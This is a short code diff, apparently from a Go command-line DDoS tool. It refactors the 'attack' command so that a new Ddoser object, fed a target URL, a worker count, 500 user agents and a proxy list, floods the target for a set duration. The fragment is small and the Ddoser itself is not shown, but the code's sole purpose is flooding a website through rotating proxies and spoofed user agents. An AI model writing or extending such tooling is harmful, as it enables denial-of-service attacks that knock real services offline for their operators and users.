@@ -26,11 +26,14 @@ var attackCommand = &cli.Command{
 		useragents := getUserAgents(500)
 		proxies := readLines(argv.File)
 
+		ddoser, err := NewDdoser(argv.Url, argv.Worker, useragents, proxies)
+		if err != nil {
+			return err
+		}
+
 		fmt.Println("[+] Starting attack...")
 
-		for i := 0; i < argv.Worker; i++ {
-			go worker(argv.Url, useragents, proxies)
-		}
+		ddoser.Run()
 
 		time.Sleep(time.Duration(argv.Duration) * time.Second)
 
